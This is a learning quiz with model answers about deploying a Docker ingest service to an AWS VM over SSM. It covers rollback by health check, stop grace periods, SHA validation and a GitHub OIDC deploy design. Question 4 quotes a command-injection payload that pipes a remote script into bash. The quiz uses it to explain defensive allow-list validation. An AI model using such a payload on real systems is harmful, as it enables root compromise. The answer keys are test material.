# Quiz 017 · PR #19 · Deploying ingest to the VM

**How to take it:** write your answer under each question first, then open the model answer to compare. When you've finished, tell Claude, who grades your written answers and logs the score in `docs/learning/quiz-log.md`. You need 4 of 5 before M0 closes. A vague answer scores zero.

To reveal an answer: click **Model answer** on GitHub, or open VS Code's preview (`Cmd+Shift+V`) and click it there.

---

## 1. What does this do?

Trace `make deploy-ingest SHA=<sha>` from your laptop to a running container. Where does each piece run, and how does the command reach a VM that has no SSH and no inbound ports?

**Your answer:**

>

<details>
<summary>Model answer</summary>

**On the laptop** (`scripts/deploy_ingest.py`):

1. Validates the SHA: a full 40-character lowercase SHA, nothing else.
2. Checks GHCR serves that image **anonymously**, exactly as the VM will pull it, and aborts before touching the VM if not.
3. Reads the instance ID and bucket from `terraform output`.
4. Calls **SSM `send_command`** with the `AWS-RunShellScript` document. The commands export `SHA`, `BUCKET`, and the compose file (base64), write the remote script (base64) to the VM, and run it.
5. Polls `get_command_invocation` until it finishes, then prints the VM's output.

**On the VM** (`deploy/remote-deploy-ingest.sh`, run as root by the SSM agent): writes `compose.ingest.yml` and `.env`, runs `docker compose pull` and `up -d`, waits up to 3 minutes for Docker's health check to say `healthy`, records the SHA in `ingest.tag`, or rolls back.

**How it gets there:** the SSM agent on the VM keeps an **outbound** HTTPS connection to AWS Systems Manager open. `send_command` queues the command with AWS (authorized by your IAM user), and the agent receives it over that existing connection, the same way Session Manager works. Nothing connects *into* the VM.

**Must mention for full credit:** the laptop-side steps (SHA check, anonymous image check, `send_command`, polling); the VM side (compose pull and up, health wait, record or roll back); delivery over the agent's outbound connection to SSM.

</details>

---

## 2. What does this do?

How does the remote script decide between "deployed," "rolled back," and "rollback also unhealthy"? What file makes rollback possible?

**Your answer:**

>

<details>
<summary>Model answer</summary>

`/opt/ghost-bus-la/ingest.tag` holds the **last SHA that became healthy**. The script reads it into `PREVIOUS` before deploying.

1. It deploys the new SHA and polls `docker inspect … .State.Health.Status` every 10 s for up to 180 s.
2. **`healthy`:** writes the new SHA to `ingest.tag` and reports "deployed." Only a healthy deploy updates the tag, so it always points to a known-good build.
3. **`unhealthy`, or no verdict after 180 s:** prints the last 30 log lines. If `PREVIOUS` exists and differs from the new SHA, it redeploys `PREVIOUS` and waits again: "rolled back," or, if that also fails, "rollback ALSO unhealthy." Either way it exits 1, so the laptop prints `DEPLOY FAILED`.

On the **very first deploy** there is no `ingest.tag`, so there's nothing to roll back to. A failed first deploy just fails.

**Must mention for full credit:** `ingest.tag` holds the last healthy SHA and is written only after a healthy deploy; the health polling with a timeout; redeploy the previous SHA on failure; the first-deploy case.

</details>

---

## 3. What breaks if…

The compose file sets `stop_grace_period: 90s`. What would happen to data on every deploy if it were left at Docker's default of 10 seconds?

**Your answer:**

>

<details>
<summary>Model answer</summary>

`docker compose up` with a new image stops the old container first: `docker stop` sends **SIGTERM**, then **SIGKILL** after the grace period. The service's shutdown is: streams make **final cuts** (frames since the last grid cut), then the uploader's **final pass** uploads remaining spool files and the open fetch-log hour, with up to 60 s allowed.

With 10 s:

- If S3 is slow, or several files are pending, the final pass is **killed mid-upload**. Spool files survive on the volume and the new container uploads them, so snapshots aren't lost. But the **open fetch-log hour** can be cut off, and any work in progress is aborted.
- If a final cut is still writing when SIGKILL arrives, its `.tmp` is abandoned. The new container clears it at startup, but the frames since the last grid cut (up to 30 or 60 s of data) are **lost**.

90 s covers the 60 s uploader timeout plus cuts and closes. Compose's `stop_grace_period` is where the service's timing assumptions meet Docker's (quiz 013, question 5).

**Must mention for full credit:** SIGTERM then SIGKILL after the grace period; the final cuts and final upload need time; with 10 s they're killed (possible loss of the last interval's frames, an interrupted upload or log); spool files survive on the volume.

</details>

---

## 4. What breaks if…

`deploy_ingest.py` accepted any string for the SHA, for example `main` or a short SHA like `dd166b2`. Give two problems, one of them a security problem.

**Your answer:**

>

<details>
<summary>Model answer</summary>

1. **Ambiguity and drift:** `main` is a moving tag (quiz 016, question 4). The deploy would record `main` in `ingest.tag`, so "roll back to the previous version" would redeploy whatever `main` points to *now*, and nobody could say which build is running. Short SHAs aren't image tags at all here (CI tags full SHAs), so the pull fails, or worse, matches a different tag later.
2. **Command injection:** the SHA is interpolated into a shell line that runs **as root on the production VM** (`export SHA=…`). A value like `x; curl evil.sh | bash` would run arbitrary commands with root, through SSM, under your credentials. The regex `^[0-9a-f]{40}$` allows only hex digits, so nothing that could break out of the line gets through. The test `test_only_a_full_lowercase_sha_is_accepted` includes exactly such a payload.

The general rule: validate anything that ends up in a shell, SQL, or a path, with an **allow-list** of what's valid. Don't try to escape your way out of a deny-list.

**Must mention for full credit:** a moving or short tag breaks rollback and traceability; shell injection as root through the interpolated value; the strict allow-list regex (and its test) prevents both.

</details>

---

## 5. How would you change it to…

Today you run deploys from your laptop. The infra spec says merges to `main` deploy automatically from GitHub Actions (M2). What changes, and what must the GitHub workflow **not** have?

**Your answer:**

>

<details>
<summary>Model answer</summary>

**Changes:**

- A `deploy` job in GitHub Actions that runs after the image workflow publishes the SHA, and calls the same `deploy()` logic (or an SSM document) with `${{ github.sha }}`.
- AWS access through **OIDC**: an IAM role (in Terraform) that trusts GitHub's OIDC provider, **restricted to this repo and the `main` branch** (the `sub` claim). Its permissions: `ssm:SendCommand` on **this instance** and one document, plus `ssm:GetCommandInvocation`. Nothing else.
- Instance ID and bucket from repository variables, or a read-only lookup by tag, since CI has no local `terraform output`.
- Optionally, GitHub Environments with required reviewers for production, a deploy record (`ops.deploy`), and a smoke test after deploy (infra spec, section 6).

**Must not have:**

- **Long-lived AWS access keys** in GitHub secrets. That's the leaked-key failure mode (2026-11-10). OIDC tokens last minutes and are scoped to one run.
- **Broad permissions** such as `AdministratorAccess`, `ssm:SendCommand` on `*`, or S3 delete. A compromised workflow (a malicious PR, a hijacked action) would then own the account. Hence pinned action SHAs too.
- A trust policy that lets **pull requests or forks** assume the deploy role.

**Must mention for full credit:** a deploy job after the image publish, reusing the same logic; OIDC role scoped to repo and branch with only SSM send and get on this instance; no stored keys, no broad permissions, and PRs or forks unable to assume it.

</details>
